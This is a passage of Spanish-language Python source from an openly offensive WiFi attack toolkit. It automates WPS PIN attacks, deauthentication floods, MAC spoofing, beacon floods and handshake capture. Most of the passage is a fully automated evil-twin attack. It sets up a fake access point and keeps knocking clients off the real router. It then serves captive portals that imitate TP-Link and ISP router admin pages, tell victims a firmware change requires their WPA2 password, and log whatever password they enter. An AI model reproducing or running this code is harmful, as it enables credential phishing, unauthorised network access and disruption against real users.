    print(f"\n  {WHITE}Modo de ataque:{END}")
    print(f"  {WHITE}[1]{END} {CYAN}Pixie Dust (Reaver){END}  — Rápido, funciona en routers vulnerables")
    print(f"  {WHITE}[2]{END} {CYAN}Pixie Dust (Bully){END}   — Alternativa a Reaver")
    print(f"  {WHITE}[3]{END} {YELLOW}PIN Brute Force (Reaver){END} — Lento pero exhaustivo")
    print(f"  {WHITE}[4]{END} {YELLOW}PIN Brute Force (Bully){END}  — Alternativa lenta\n")

    modo = ask("Seleccione modo")

    if modo == "1":
        if not check_tool("reaver"):
            error("reaver no instalado: sudo apt install reaver")
            pause_back()
            return
        info("Ejecutando Pixie Dust con Reaver...")
        tip("Si el router es vulnerable, obtendrá el PIN en segundos.")
        run(f"reaver -i {interfaz} -b {bssid} -c {channel} -K 1 -vv")
    elif modo == "2":
        if not check_tool("bully"):
            error("bully no instalado: sudo apt install bully")
            pause_back()
            return
        info("Ejecutando Pixie Dust con Bully...")
        run(f"bully {interfaz} -b {bssid} -c {channel} -e {essid} -d --force")
    elif modo == "3":
        if not check_tool("reaver"):
            error("reaver no instalado: sudo apt install reaver")
            pause_back()
            return
        warn("Este ataque puede tardar HORAS. Muchos routers bloquean tras varios intentos.")
        run(f"reaver -i {interfaz} -b {bssid} -c {channel} -vv -N -d 0 -t 10 --no-associate")
    elif modo == "4":
        if not check_tool("bully"):
            error("bully no instalado: sudo apt install bully")
            pause_back()
            return
        warn("Este ataque puede tardar HORAS.")
        run(f"bully {interfaz} -b {bssid} -c {channel} -e {essid} --timeout 10 -S --force")
    else:
        error("Opción inválida.")

    pause_back()

def deauth_attack():
    """[13] Ataque de deautenticación."""
    separador("ATAQUE DE DEAUTENTICACIÓN")
    print(f"""
  {WHITE}¿Qué hace?{END}
  {DIM}Envía paquetes especiales que desconectan a los dispositivos del router.
  Útil para: forzar capturas de handshake, pruebas de DoS en redes propias.{END}
    """)

    interfaz = select_interface()
    bssid, channel, essid = select_target_from_scan(interfaz)
    if not bssid:
        pause_back()
        return

    run(f"iwconfig {interfaz} channel {channel} 2>/dev/null")

    cliente = ask("MAC de cliente específico (Enter = desconectar TODOS)")
    if cliente and not validate_bssid(cliente):
        error("Formato de MAC inválido.")
        pause_back()
        return

    paquetes = ask("Paquetes a enviar (0 = continuo hasta CTRL+C, recomendado: 20)")
    try:
        paquetes = max(0, int(paquetes))
    except ValueError:
        paquetes = 20

    client_flag = f"-c {cliente}" if cliente else ""
    target_desc = f"cliente {cliente}" if cliente else f"TODOS los clientes de {essid}"
    warn(f"Deautenticando: {target_desc}")
    tip("Presione CTRL+C para detener.")
    time.sleep(1)

    try:
        run(f"aireplay-ng -0 {paquetes} -a {bssid} {client_flag} {interfaz}")
    except KeyboardInterrupt:
        pass

    ok("Ataque detenido.")
    pause_back()

def spoof_mac():
    """[12] Falsificar dirección MAC."""
    separador("FALSIFICAR DIRECCIÓN MAC")
    print(f"""
  {WHITE}¿Para qué sirve?{END}
  {DIM}La MAC identifica tu adaptador en la red. Cambiarla oculta tu identidad
  real y permite imitar dispositivos conocidos para evadir filtros MAC.{END}
    """)

    interfaz = select_interface()

    print(f"  {WHITE}[1]{END} Ingresar MAC personalizada")
    print(f"  {WHITE}[2]{END} Generar MAC aleatoria")
    print(f"  {WHITE}[3]{END} Imitar fabricante conocido (Apple, Samsung, etc.)\n")

    opcion = ask("Seleccione")

    if opcion == "1":
        nueva_mac = ask("Nueva MAC (AA:BB:CC:DD:EE:FF)")
        if not validate_bssid(nueva_mac):
            error("Formato inválido.")
            pause_back()
            return

    elif opcion == "2":
        octetos = [random.randint(0, 255) for _ in range(6)]
        octetos[0] = octetos[0] & 0xFE
        nueva_mac = ':'.join(f'{o:02X}' for o in octetos)
        info(f"MAC aleatoria generada: {CYAN}{nueva_mac}{END}")

    elif opcion == "3":
        vendors = {
            "1": ("Apple",   "AC:BC:32"),
            "2": ("Samsung", "F4:42:8F"),
            "3": ("TP-Link", "50:C7:BF"),
            "4": ("Huawei",  "54:51:1B"),
            "5": ("Xiaomi",  "28:6C:07"),
            "6": ("Intel",   "3C:A9:F4"),
            "7": ("Cisco",   "00:1A:2B"),
        }
        print()
        for k, (v, p) in vendors.items():
            print(f"   {WHITE}[{k}]{END} {v}  {DIM}({p}:xx:xx:xx){END}")
        v = ask("\nSeleccione fabricante")
        if v not in vendors:
            error("Opción inválida.")
            pause_back()
            return
        name, prefix = vendors[v]
        suffix = ':'.join(f'{random.randint(0,255):02X}' for _ in range(3))
        nueva_mac = f"{prefix}:{suffix}"
        info(f"MAC {name} generada: {CYAN}{nueva_mac}{END}")
    else:
        error("Opción inválida.")
        pause_back()
        return

    run(f"ip link set {interfaz} down")
    run(f"ip link set {interfaz} address {nueva_mac}")
    run(f"ip link set {interfaz} up")

    result = run(f"ip link show {interfaz}", capture=True) or ""
    if nueva_mac.lower() in result.lower():
        ok(f"MAC cambiada a: {CYAN}{nueva_mac}{END}")
    else:
        warn("No se pudo verificar. Compruebe con: ip link show")
    time.sleep(2)

def fake_ap():
    """[14] Fake AP (beacon flood)."""
    separador("FAKE AP — INUNDACIÓN DE BEACONS")
    print(f"""
  {WHITE}¿Qué hace?{END}
  {DIM}Crea cientos de redes WiFi falsas para confundir a dispositivos cercanos.
  Útil para pruebas de seguridad y distracción en pentesting.{END}
    """)

    if not check_tool("mdk4") and not check_tool("mdk3"):
        error("mdk4 no instalado.")
        info("Instale: sudo apt install mdk4")
        pause_back()
        return

    mdk = "mdk4" if check_tool("mdk4") else "mdk3"
    interfaz = select_interface()
    channel = ask("Canal (1-13, recomendado: 6)")
    if not validate_channel(channel):
        error("Canal inválido.")
        pause_back()
        return

    print(f"\n  {WHITE}[1]{END} Usar diccionario de SSIDs existente")
    print(f"  {WHITE}[2]{END} Crear diccionario ahora\n")
    crear = ask("Seleccione")

    if crear == "2":
        os.system('sudo bash AP_generator.sh')
        diccionario = ask("Ruta del diccionario generado")
    else:
        diccionario = ask("Ruta del diccionario (Enter = wordlist/fakeAP.txt)")
        if not diccionario:
            diccionario = "wordlist/fakeAP.txt"

    if not os.path.exists(diccionario):
        error(f"Diccionario no encontrado: {diccionario}")
        pause_back()
        return

    info("Iniciando beacon flood. Presione CTRL+C para detener.")
    if mdk == "mdk4":
        run(f"mdk4 {interfaz} b -f {diccionario} -a -s 1000 -c {channel}")
    else:
        run(f"mdk3 {interfaz} b -f {diccionario} -a -s 1000 -c {channel}")
    pause_back()

def _evil_twin_monitor(essid: str, bssid: str, channel: str,
                        iface: str, stop_event=None, timeout_s: int = 600) -> str | None:
    """
    Evil Twin en modo monitor usando airbase-ng.
    Puede correr en paralelo con el Exploit Engine sobre la misma interfaz.
    Retorna la clave capturada o None.
    """
    import threading as _thr, queue as _queue
    from http.server import BaseHTTPRequestHandler, HTTPServer
    from urllib.parse import parse_qs

    os.makedirs("/tmp/herradura_twin", exist_ok=True)
    creds_file   = "/tmp/herradura_twin/creds.txt"
    portal_path  = "/tmp/herradura_twin/index.html"
    with open(portal_path, "w") as _f:
        _f.write(_build_portal_html(essid, bssid))

    _q         = _queue.Queue()
    _ess       = essid
    _creds     = creds_file
    _ppath     = portal_path

    class _H(BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def do_GET(self):
            if self.path != "/":
                self.send_response(302)
                self.send_header("Location", "http://192.168.1.1/")
                self.end_headers(); return
            with open(_ppath, "rb") as _f: body = _f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers(); self.wfile.write(body)
        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            pwd = parse_qs(self.rfile.read(length).decode(errors="replace")
                           ).get("pass", [""])[0].strip()
            import datetime as _dt
            ts = _dt.datetime.now().strftime("%H:%M:%S")
            with open(_creds, "a") as _cf:
                _cf.write(f"[{ts}] IP={self.client_address[0]} SSID={_ess} PASS={pwd}\n")
            _q.put(pwd)
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write("""<!DOCTYPE html><html><head><meta charset=UTF-8>
<style>body{font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;
align-items:center;min-height:100vh}.b{background:#fff;padding:40px 30px;border-radius:12px;
text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:360px;width:90%}
.ok{font-size:52px}.h{color:#2e7d32}.p{color:#666;font-size:14px}</style></head>
<body><div class=b><div class=ok>&#x2705;</div><h2 class=h>Conectado correctamente</h2>
<p class=p>Su dispositivo se reconect&#xF3; a la red.<br>Redirigiendo...</p>
<script>setTimeout(()=>location.href='http://google.com',3000)</script>
</div></body></html>""".encode("utf-8"))

    # Iniciar airbase-ng (crea at0 en modo monitor)
    ab_proc = subprocess.Popen(
        f"airbase-ng -e '{essid}' -c {channel} {iface} 2>/dev/null",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(3)

    # Configurar at0
    run("ip addr flush dev at0 2>/dev/null", capture=True)
    run("ip addr add 192.168.1.1/24 dev at0 2>/dev/null", capture=True)
    run("ip link set at0 up 2>/dev/null", capture=True)

    # dnsmasq en at0
    with open("/tmp/herradura_twin/dnsmasq_at0.conf", "w") as _f:
        _f.write("interface=at0\ndhcp-range=192.168.1.10,192.168.1.100,"
                 "255.255.255.0,10m\ndhcp-option=3,192.168.1.1\n"
                 "dhcp-option=6,192.168.1.1\naddress=/#/192.168.1.1\nno-resolv\n")
    dm_proc = subprocess.Popen(
        ["dnsmasq", "-C", "/tmp/herradura_twin/dnsmasq_at0.conf", "--no-daemon"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(1)

    # HTTP servidor portal
    try:
        httpd = HTTPServer(("0.0.0.0", 80), _H)
    except OSError:
        run("fuser -k 80/tcp 2>/dev/null", capture=True)
        time.sleep(1)
        httpd = HTTPServer(("0.0.0.0", 80), _H)
    _thr.Thread(target=httpd.serve_forever, daemon=True).start()

    # Deauth continuo en background
    # Preferir interfaz secundaria para deauth (evita conflicto con airbase-ng en la misma iface)
    _ifaces_raw = run("iw dev 2>/dev/null | grep Interface | awk '{print $2}'", capture=True) or ""
    _deauth_iface = iface
    for _di in _ifaces_raw.strip().splitlines():
        _di = _di.strip()
        if _di and _di != iface and _di != "at0":
            _di_mode = run(f"iw dev {_di} info 2>/dev/null | grep type", capture=True) or ""
            if "monitor" in _di_mode:
                _deauth_iface = _di
                break
    deauth_proc = subprocess.Popen(
        f"aireplay-ng -0 0 -a {bssid} -D {_deauth_iface} 2>/dev/null",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    # Esperar credencial o señal de stop
    captured = None
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        if stop_event and stop_event.is_set():
            break
        try:
            captured = _q.get(timeout=3)
            break
        except Exception:
            pass

    # Limpieza
    deauth_proc.terminate()
    ab_proc.terminate(); ab_proc.wait()
    dm_proc.terminate(); dm_proc.wait()
    httpd.shutdown()
    run("ip link set at0 down 2>/dev/null; ip addr flush dev at0 2>/dev/null",
        capture=True)

    return captured


def _build_portal_html(essid: str, bssid: str) -> str:
    """
    Portal cautivo que imita la pantalla de administración real del router.
    Parece que estás en 192.168.0.1 configurando la red WiFi.
    """
    essid_up = essid.upper()
    bssid_up = bssid.upper()

    is_tplink = "TP-LINK" in essid_up or "TPLINK" in essid_up or \
                any(bssid_up.startswith(o) for o in [
                    "E8:65:D4","A0:F3:C1","50:C7:BF","98:DA:C4",
                    "B0:BE:76","C8:3A:35","54:A7:03","18:D6:C7"])
    is_antel  = "ANTEL" in essid_up
    is_frog   = "FROG" in essid_up or "WIFIFROG" in essid_up

    # ── TP-Link: copia exacta del admin web de TP-Link ────────────────────────
    if is_tplink:
        return f"""<!DOCTYPE html><html lang="es"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>TP-Link | Configuraci&#xF3;n Inal&#xE1;mbrica</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',Arial,sans-serif}}
body{{background:#f0f0f0;min-height:100vh}}
#header{{background:#009fda;height:50px;display:flex;align-items:center;padding:0 20px}}
#header .logo{{color:#fff;font-size:22px;font-weight:700;letter-spacing:1px}}
#header .model{{color:#ffffffaa;font-size:12px;margin-left:10px;margin-top:3px}}
#nav{{background:#007ab8;display:flex;height:36px}}
#nav span{{color:#ffffffbb;font-size:13px;padding:0 18px;line-height:36px;cursor:pointer}}
#nav span.active{{color:#fff;border-bottom:2px solid #fff;font-weight:600}}
#wrap{{max-width:700px;margin:24px auto;padding:0 12px}}
.box{{background:#fff;border:1px solid #ddd;border-radius:4px;margin-bottom:16px}}
.box-title{{background:#009fda;color:#fff;font-size:13px;font-weight:600;
            padding:8px 14px;border-radius:4px 4px 0 0}}
.box-body{{padding:20px 18px}}
.row{{display:flex;align-items:center;margin-bottom:14px}}
.row label{{width:220px;font-size:13px;color:#444;flex-shrink:0}}
.row .val{{font-size:13px;color:#222;font-weight:500}}
.row input{{flex:1;padding:7px 10px;border:1px solid #ccc;border-radius:3px;font-size:13px}}
.row input:focus{{border-color:#009fda;outline:none;box-shadow:0 0 0 2px #009fda33}}
.row .eye{{margin-left:8px;cursor:pointer;color:#888;font-size:16px;user-select:none}}
.alert{{background:#fff3cd;border:1px solid #ffc107;border-radius:3px;
        padding:10px 14px;font-size:13px;color:#856404;margin-bottom:16px}}
.btns{{display:flex;justify-content:flex-end;gap:10px;padding:12px 18px;
       border-top:1px solid #eee}}
.btn-save{{background:#009fda;color:#fff;border:none;padding:8px 28px;
           border-radius:3px;font-size:13px;font-weight:600;cursor:pointer}}
.btn-save:hover{{background:#007ab8}}
.btn-cancel{{background:#f0f0f0;color:#444;border:1px solid #ccc;padding:8px 20px;
             border-radius:3px;font-size:13px;cursor:pointer}}
.status-bar{{background:#333;color:#aaa;font-size:11px;padding:4px 14px;
             text-align:right}}
</style></head><body>
<div id="header">
  <span class="logo">TP-Link</span>
  <span class="model">Router WiFi — tplinkwifi.net</span>
</div>
<div id="nav">
  <span>Estado</span><span>Internet</span>
  <span class="active">Inal&#xE1;mbrico</span>
  <span>DHCP</span><span>Seguridad</span><span>Sistema</span>
</div>
<div id="wrap">
  <div class="alert">
    &#x26A0;&#xFE0F; Se detect&#xF3; un cambio en la configuraci&#xF3;n de seguridad.
    Confirme la contrase&#xF1;a WPA2 para aplicar los cambios y restablecer la conexi&#xF3;n.
  </div>
  <div class="box">
    <div class="box-title">Configuraci&#xF3;n de Red Inal&#xE1;mbrica</div>
    <div class="box-body">
      <div class="row"><label>Nombre de red (SSID):</label>
        <span class="val">{essid}</span></div>
      <div class="row"><label>Regi&#xF3;n:</label>
        <span class="val">Am&#xE9;rica Latina</span></div>
      <div class="row"><label>Modo:</label>
        <span class="val">11bgn mixto</span></div>
      <div class="row"><label>Ancho de canal:</label>
        <span class="val">Autom&#xE1;tico</span></div>
      <div class="row"><label>Modo de seguridad:</label>
        <span class="val">WPA2-Personal (AES)</span></div>
    </div>
  </div>
  <div class="box">
    <div class="box-title">Contrase&#xF1;a WPA</div>
    <form method="POST" action="/submit"
          onsubmit="this.querySelector('.btn-save').textContent='Guardando...'">
      <div class="box-body">
        <div class="row">
          <label>Contrase&#xF1;a inal&#xE1;mbrica:</label>
          <input type="password" name="pass" id="pw" required autofocus
                 placeholder="Ingrese la contrase&#xF1;a actual" autocomplete="current-password"
                 minlength="8" maxlength="64">
          <span class="eye" onclick="var i=document.getElementById('pw');
            i.type=i.type=='password'?'text':'password'">&#x1F441;</span>
        </div>
        <div class="row">
          <label style="color:#888;font-size:12px">Longitud: 8-63 caracteres (WPA2-PSK)</label>
        </div>
      </div>
      <div class="btns">
        <button type="button" class="btn-cancel">Cancelar</button>
        <button type="submit" class="btn-save">Guardar</button>
      </div>
    </form>
  </div>
</div>
<div class="status-bar">192.168.0.1 &nbsp;|&nbsp; Firmware: 3.16.9 &nbsp;|&nbsp; {essid}</div>
</body></html>"""

    # ── ANTEL / Frog / Genérico: pantalla de router Sagemcom/Technicolor ──────
    if is_antel:
        color1, color2, title = "#00529b", "#003d7a", "ANTEL Router"
        model = "Sagemcom F@st 3890"
    elif is_frog:
        color1, color2, title = "#2e7d32", "#1b5e20", "Frog WiFi Router"
        model = "ZTE H267N"
    else:
        color1, color2, title = "#37474f", "#263238", "Router WiFi"
        model = "Technicolor TG789"

    return f"""<!DOCTYPE html><html lang="es"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title} — Configuraci&#xF3;n WiFi</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0;font-family:Arial,'Helvetica Neue',sans-serif}}
body{{background:#e8eaf0;min-height:100vh}}
#top{{background:linear-gradient(90deg,{color1},{color2});
      padding:12px 20px;display:flex;align-items:center;justify-content:space-between}}
#top .brand{{color:#fff;font-size:18px;font-weight:700;letter-spacing:.5px}}
#top .model{{color:#ffffff88;font-size:11px}}
#tabs{{background:{color1}dd;display:flex}}
#tabs a{{color:#ffffffaa;font-size:12px;padding:9px 16px;text-decoration:none;cursor:pointer}}
#tabs a.on{{color:#fff;background:{color1};border-bottom:2px solid #fff;font-weight:600}}
#main{{max-width:680px;margin:20px auto;padding:0 10px}}
.panel{{background:#fff;border:1px solid #c8cdd4;border-radius:3px;margin-bottom:14px;
        box-shadow:0 1px 3px rgba(0,0,0,.07)}}
.panel-head{{background:#f0f2f5;border-bottom:1px solid #c8cdd4;padding:9px 14px;
             font-size:13px;font-weight:700;color:#333}}
.panel-body{{padding:16px 14px}}
table{{width:100%;border-collapse:collapse;font-size:13px}}
td{{padding:7px 10px;vertical-align:middle;color:#444}}
td:first-child{{width:210px;color:#666;font-weight:500}}
tr:nth-child(even){{background:#f9f9fb}}
.warn{{background:#fff8e1;border:1px solid #ffe082;border-left:4px solid #ffc107;
       padding:10px 14px;font-size:13px;color:#5d4037;margin-bottom:14px;border-radius:2px}}
.fw{{display:flex;align-items:center;gap:8px}}
.fw input{{flex:1;padding:8px 10px;border:1px solid #bbb;border-radius:3px;
           font-size:13px;background:#fafafa}}
.fw input:focus{{border-color:{color1};outline:none;box-shadow:0 0 0 2px {color1}33}}
.fw .eye{{cursor:pointer;color:#888;font-size:15px;user-select:none;padding:4px}}
.hint{{font-size:11px;color:#999;margin-top:5px}}
.foot{{display:flex;justify-content:flex-end;gap:8px;padding:10px 14px;
       border-top:1px solid #eee;background:#fafafa}}
.apply{{background:{color1};color:#fff;border:none;padding:8px 26px;
        border-radius:3px;font-size:13px;font-weight:600;cursor:pointer}}
.apply:hover{{background:{color2}}}
.discard{{background:#fff;color:#555;border:1px solid #bbb;padding:8px 18px;
          border-radius:3px;font-size:13px;cursor:pointer}}
#statusbar{{background:#2b2b2b;color:#888;font-size:11px;padding:4px 14px;text-align:right}}
</style></head><body>
<div id="top">
  <div><div class="brand">{title}</div><div class="model">{model} &mdash; 192.168.1.1</div></div>
  <div style="color:#ffffff66;font-size:11px">Admin &nbsp;|&nbsp; Cerrar sesi&#xF3;n</div>
</div>
<div id="tabs">
  <a>Inicio</a><a>Internet</a><a class="on">WiFi</a>
  <a>DHCP</a><a>Firewall</a><a>Sistema</a>
</div>
<div id="main">
  <div class="warn">
    &#x26A0; El router detect&#xF3; una actualizaci&#xF3;n de firmware que modific&#xF3; la
    configuraci&#xF3;n de seguridad. Para restablecer la conexi&#xF3;n de los dispositivos,
    ingrese la contrase&#xF1;a WiFi actual y presione <strong>Aplicar</strong>.
  </div>
  <div class="panel">
    <div class="panel-head">Red Inal&#xE1;mbrica — Informaci&#xF3;n</div>
    <div class="panel-body">
      <table>
        <tr><td>Nombre de red (SSID)</td><td><strong>{essid}</strong></td></tr>
        <tr><td>BSSID</td><td>{bssid}</td></tr>
        <tr><td>Banda</td><td>2.4 GHz (802.11n)</td></tr>
        <tr><td>Modo de seguridad</td><td>WPA2-PSK / AES</td></tr>
        <tr><td>Estado</td><td><span style="color:#e53935">&#x25CF;</span> Requiere verificaci&#xF3;n</td></tr>
      </table>
    </div>
  </div>
  <div class="panel">
    <div class="panel-head">Contrase&#xF1;a de red WiFi</div>
    <form method="POST" action="/submit"
          onsubmit="this.querySelector('.apply').textContent='Aplicando...'">
      <div class="panel-body">
        <div class="fw">
          <input type="password" name="pass" id="pw" required autofocus
                 placeholder="Contrase&#xF1;a WPA2 actual" minlength="8" maxlength="64"
                 autocomplete="current-password">
          <span class="eye" onclick="var i=document.getElementById('pw');
            i.type=i.type=='password'?'text':'password'">&#x1F441;</span>
        </div>
        <div class="hint">M&#xED;nimo 8 caracteres &mdash; WPA2 Personal (PSK)</div>
      </div>
      <div class="foot">
        <button type="button" class="discard">Descartar</button>
        <button type="submit" class="apply">Aplicar</button>
      </div>
    </form>
  </div>
</div>
<div id="statusbar">192.168.1.1 &nbsp;|&nbsp; {model} &nbsp;|&nbsp; Firmware v2.3.1 &nbsp;|&nbsp; {essid}</div>
</body></html>"""


def _evil_twin_run(essid: str, bssid: str, channel: str,
                   iface_ap: str, iface_net: str = "eth0",
                   timeout_s: int = 300) -> str | None:
    """
    Evil Twin completamente automático.
    - Levanta AP falso (hostapd) con mismo SSID
    - Deauth continuo en background
    - Portal cautivo que imita el router real
    - Retorna la contraseña capturada o None
    """
    import threading, queue

    os.makedirs("/tmp/herradura_twin", exist_ok=True)

    # ── hostapd.conf ──────────────────────────────────────────────────────────
    hostapd_conf = f"""interface={iface_ap}
driver=nl80211
ssid={essid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=0
"""
    with open("/tmp/herradura_twin/hostapd.conf", "w") as f:
        f.write(hostapd_conf)

    # ── dnsmasq.conf ─────────────────────────────────────────────────────────
    dnsmasq_conf = """interface={iface}
dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,10m
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
no-resolv
log-dhcp
""".format(iface=iface_ap)
    with open("/tmp/herradura_twin/dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)

    # ── Portal HTML ───────────────────────────────────────────────────────────
    portal_html  = "/tmp/herradura_twin/index.html"
    creds_file   = "/tmp/herradura_twin/creds.txt"
    with open(portal_html, "w") as f:
        f.write(_build_portal_html(essid, bssid))

    # ── Servidor HTTP capturador ───────────────────────────────────────────────
    _q: queue.Queue = queue.Queue()
    _portal_path    = portal_html
    _creds_path     = creds_file
    _essid_cap      = essid

    from http.server import BaseHTTPRequestHandler, HTTPServer
    from urllib.parse import parse_qs

    class _Handler(BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _send_html(self, code, body):
            self.send_response(code)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body.encode())
        def do_GET(self):
            # Redirect any URL to portal
            if self.path != "/":
                self.send_response(302)
                self.send_header("Location", "http://192.168.1.1/")
                self.end_headers()
                return
            with open(_portal_path, "rb") as f:
                body = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(body)
        def do_POST(self):
            length = int(self.headers.get("Content-Length", 0))
            data   = self.rfile.read(length).decode(errors="replace")
            pwd    = parse_qs(data).get("pass", [""])[0].strip()
            ip     = self.client_address[0]
            import datetime as _dt
            ts     = _dt.datetime.now().strftime("%H:%M:%S")
            line   = f"[{ts}] IP={ip} SSID={_essid_cap} PASS={pwd}"
            with open(_creds_path, "a") as cf:
                cf.write(line + "\n")
            _q.put(pwd)
            # Página de éxito — parece que funcionó
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write("""<!DOCTYPE html><html><head>
<meta charset=UTF-8><meta name=viewport content=width=device-width,initial-scale=1>
<title>Conectando...</title>
<style>body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;
justify-content:center;align-items:center;min-height:100vh}
.box{background:#fff;padding:40px 30px;border-radius:12px;text-align:center;
box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:380px;width:90%}
.ok{font-size:56px;margin-bottom:12px}
h2{color:#2e7d32;margin-bottom:8px}p{color:#666;font-size:14px}</style>
</head><body><div class=box><div class=ok>&#x2705;</div>
<h2>Conectado exitosamente</h2>
<p>Su dispositivo se ha conectado a la red.<br>Redirigiendo...</p>
<script>setTimeout(()=>location.href='http://google.com',3500)</script>
</div></body></html>""".encode("utf-8"))

    httpd = HTTPServer(("0.0.0.0", 80), _Handler)
    srv_thread = threading.Thread(target=httpd.serve_forever, daemon=True)

    # ── Preparar interfaz ─────────────────────────────────────────────────────
    run("pkill hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null", capture=True)
    time.sleep(1)
    run(f"ip addr flush dev {iface_ap} 2>/dev/null", capture=True)
    run(f"ip addr add 192.168.1.1/24 dev {iface_ap} 2>/dev/null", capture=True)
    run(f"ip link set {iface_ap} up 2>/dev/null", capture=True)

    # ── Levantar servicios ────────────────────────────────────────────────────
    hp = subprocess.Popen(
        ["hostapd", "/tmp/herradura_twin/hostapd.conf"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(2)
    dm = subprocess.Popen(
        ["dnsmasq", "-C", "/tmp/herradura_twin/dnsmasq.conf", "--no-daemon"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(1)
    srv_thread.start()

    # ── Deauth continuo en background ─────────────────────────────────────────
    # Necesitamos otra interfaz en modo monitor para el deauth
    # Si iface_ap está en managed (para hostapd), buscamos otra mon iface
    deauth_iface = None
    for _ifc in ["wlan1mon", "wlan0mon", "wlan1"]:
        if os.path.exists(f"/sys/class/net/{_ifc}"):
            deauth_iface = _ifc
            break
    # Si no hay segunda interfaz, usamos aireplay directo sobre iface_ap
    # (hostapd soporta inyección en algunos drivers)
    _deauth_target = deauth_iface or iface_ap
    deauth_proc = subprocess.Popen(
        f"aireplay-ng -0 0 -a {bssid} {_deauth_target} 2>/dev/null",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    # ── Esperar credencial ────────────────────────────────────────────────────
    captured = None
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            captured = _q.get(timeout=5)
            break
        except Exception:
            pass

    # ── Cleanup ───────────────────────────────────────────────────────────────
    deauth_proc.terminate()
    hp.terminate(); hp.wait()
    dm.terminate(); dm.wait()
    httpd.shutdown()
    run("pkill hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null", capture=True)
    run(f"ip addr flush dev {iface_ap} 2>/dev/null", capture=True)

    return captured


def evil_twin():
    """[15] Evil Twin + Portal Cautivo — completamente automático."""
    separador("EVIL TWIN — AP FALSO AUTOMÁTICO")
    print(f"""
  {WHITE}Flujo automático:{END}
  {GREEN}1.{END} Escanea y seleccionas la red objetivo
  {GREEN}2.{END} Levanta AP falso con el mismo SSID (sin contraseña)
  {GREEN}3.{END} Deauth continuo — expulsa clientes del router real
  {GREEN}4.{END} La víctima se conecta al AP falso
  {GREEN}5.{END} Portal cautivo imita la interfaz del router real
  {GREEN}6.{END} Víctima ingresa la contraseña → capturada automáticamente
    """)

    for tool in ["hostapd", "dnsmasq", "aireplay-ng"]:
        if not check_tool(tool):
            error(f"'{tool}' no instalado.")
            pause_back(); return

    iface_ap = select_interface()

    # Escanear y elegir objetivo
    bssid, channel, essid = select_target_from_scan(iface_ap)
    if not bssid:
        pause_back(); return

    separador(f"EVIL TWIN → {essid}")
    ok(f"BSSID: {bssid}  Canal: {channel}")
    warn("El deauth continuo comenzará al instante.")
    warn("Presione CTRL+C para detener en cualquier momento.")
    print()

    creds = "/tmp/herradura_twin/creds.txt"
    pwd = _evil_twin_run(essid, bssid, channel, iface_ap, timeout_s=600)

    separador("RESULTADO EVIL TWIN")
    if pwd:
        ok(f"CONTRASEÑA CAPTURADA: {GREEN}{pwd}{END}")
        ok(f"Guardada en: {creds}")
    else:
        warn("No se capturó ninguna contraseña (tiempo agotado o sin víctimas).")
        if os.path.exists(creds):
            with open(creds) as f:
                lines = f.read().strip()
            if lines:
                print(f"\n{GREEN}{lines}{END}")
    pause_back()

def auto_crack():
    """[17] Auto-Crack: todo automático."""
    separador("AUTO-CRACK — FLUJO AUTOMÁTICO COMPLETO")
    print(f"""
  {WHITE}¿Qué hace?{END}
  {DIM}Escanea redes → Usted elige el objetivo → Captura handshake →
  Convierte el archivo → Inicia crackeo automáticamente.
  Ideal si quiere hacer todo sin pasos manuales.{END}
    """)

    interfaz = select_interface()
    bssid, channel, essid = select_target_from_scan(interfaz)
    if not bssid:
        pause_back()
        return

    os.makedirs("handshakes", exist_ok=True)
    essid_safe = re.sub(r'[^\w\-]', '_', essid)
    ruta = f"handshakes/{essid_safe}"

    diccionario = select_wordlist()
    if not diccionario:
        pause_back()
        return
    if diccionario and not os.path.exists(diccionario):
        error(f"Diccionario no encontrado: {diccionario}")
        pause_back(); return

    step(1, f"Capturando handshake de '{essid}'")
    tip("Se enviará deauth para forzar la reconexión del cliente.")
    time.sleep(2)

    cmd = (
        f"xterm -title 'Auto-Crack: {essid}' -e "
        f"'airodump-ng -c {channel} --bssid {bssid} -w {ruta} {interfaz}' & "
        f"sleep 10 && "
        f"aireplay-ng -0 20 -a {bssid} {interfaz}"
    )
    run(cmd)
    time.sleep(5)

    sp = Spinner("Verificando handshake...")
    sp.start()
    time.sleep(2)
    ok_hs, cap_file = verify_handshake(ruta)
    sp.stop()

    if ok_hs:
        ok(f"Handshake capturado: {cap_file}")
    else:
        warn(f"No verificado automáticamente. Continuando con: {ruta}-01.cap")
        cap_file = ruta + "-01.cap"

